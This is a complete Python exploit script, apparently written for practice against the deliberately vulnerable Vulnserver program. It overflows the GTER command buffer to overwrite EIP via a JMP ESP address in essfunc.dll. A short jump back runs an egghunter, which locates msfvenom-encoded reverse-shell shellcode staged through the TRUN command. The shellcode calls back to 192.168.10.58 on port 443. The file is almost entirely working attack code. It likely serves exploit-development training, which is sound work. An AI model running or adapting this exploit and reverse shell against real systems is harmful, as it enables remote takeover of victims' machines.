#!/usr/bin/python
# -*- coding: utf-8 -*-
# EIP OVERWRITE W/ EGGHUNTER #

import socket

#JMP ESP in essfunc.dll
offset = "\xaf\x11\x50\x62"

#JMP back into buffer to execute egghunter
jmpback = "\xeb\xb0\x90\x90"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#msfvenom -p windows/shell_reverse_tcp -f c -b "\x00\x0a\x0d" -v shell -e x86/shikata_ga_nai LHOST=192.168.10.58 LPORT=443
#Payload size: 351 bytes
shell = "T00WT00W"
shell+= "\x90" * 58 
shell+= "\xba\x2d\xb1\x2b\x1f\xd9\xe1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
shell+= "\x52\x31\x55\x12\x03\x55\x12\x83\xc0\x4d\xc9\xea\xe6\x46\x8c"
shell+= "\x15\x16\x97\xf1\x9c\xf3\xa6\x31\xfa\x70\x98\x81\x88\xd4\x15"
shell+= "\x69\xdc\xcc\xae\x1f\xc9\xe3\x07\x95\x2f\xca\x98\x86\x0c\x4d"
shell+= "\x1b\xd5\x40\xad\x22\x16\x95\xac\x63\x4b\x54\xfc\x3c\x07\xcb"
shell+= "\x10\x48\x5d\xd0\x9b\x02\x73\x50\x78\xd2\x72\x71\x2f\x68\x2d"
shell+= "\x51\xce\xbd\x45\xd8\xc8\xa2\x60\x92\x63\x10\x1e\x25\xa5\x68"
shell+= "\xdf\x8a\x88\x44\x12\xd2\xcd\x63\xcd\xa1\x27\x90\x70\xb2\xfc"
shell+= "\xea\xae\x37\xe6\x4d\x24\xef\xc2\x6c\xe9\x76\x81\x63\x46\xfc"
shell+= "\xcd\x67\x59\xd1\x66\x93\xd2\xd4\xa8\x15\xa0\xf2\x6c\x7d\x72"
shell+= "\x9a\x35\xdb\xd5\xa3\x25\x84\x8a\x01\x2e\x29\xde\x3b\x6d\x26"
shell+= "\x13\x76\x8d\xb6\x3b\x01\xfe\x84\xe4\xb9\x68\xa5\x6d\x64\x6f"
shell+= "\xca\x47\xd0\xff\x35\x68\x21\xd6\xf1\x3c\x71\x40\xd3\x3c\x1a"
shell+= "\x90\xdc\xe8\x8d\xc0\x72\x43\x6e\xb0\x32\x33\x06\xda\xbc\x6c"
shell+= "\x36\xe5\x16\x05\xdd\x1c\xf1\xea\x8a\x14\x3b\x83\xc8\x28\x3a"
shell+= "\xe8\x44\xce\x56\x1e\x01\x59\xcf\x87\x08\x11\x6e\x47\x87\x5c"
shell+= "\xb0\xc3\x24\xa1\x7f\x24\x40\xb1\xe8\xc4\x1f\xeb\xbf\xdb\xb5"
shell+= "\x83\x5c\x49\x52\x53\x2a\x72\xcd\x04\x7b\x44\x04\xc0\x91\xff"
shell+= "\xbe\xf6\x6b\x99\xf9\xb2\xb7\x5a\x07\x3b\x35\xe6\x23\x2b\x83"
shell+= "\xe7\x6f\x1f\x5b\xbe\x39\xc9\x1d\x68\x88\xa3\xf7\xc7\x42\x23"
shell+= "\x81\x2b\x55\x35\x8e\x61\x23\xd9\x3f\xdc\x72\xe6\xf0\x88\x72"
shell+= "\x9f\xec\x28\x7c\x4a\xb5\x59\x37\xd6\x9c\xf1\x9e\x83\x9c\x9f"
shell+= "\x20\x7e\xe2\x99\xa2\x8a\x9b\x5d\xba\xff\x9e\x1a\x7c\xec\xd2"
shell+= "\x33\xe9\x12\x40\x33\x38"

firststage = "TRUN ." + shell

crap = "\x90" * 70 + egghunter + "\x90" * (81 - len(egghunter)) + offset + jmpback + "\x43" * 2243 
#crap = "\x90" * 151 + offset + jmpback + "\x43" * 2245

#print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+=crap 

print "[*] Sending evil shenanigans - be patient"
print "[*] First Stage " + str(len(firststage)) + " bytes"
print "[*] Second Stage " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.177', 9999))
s.send(firststage)
s.recv(1024)
s.send(buffer)
s.close()
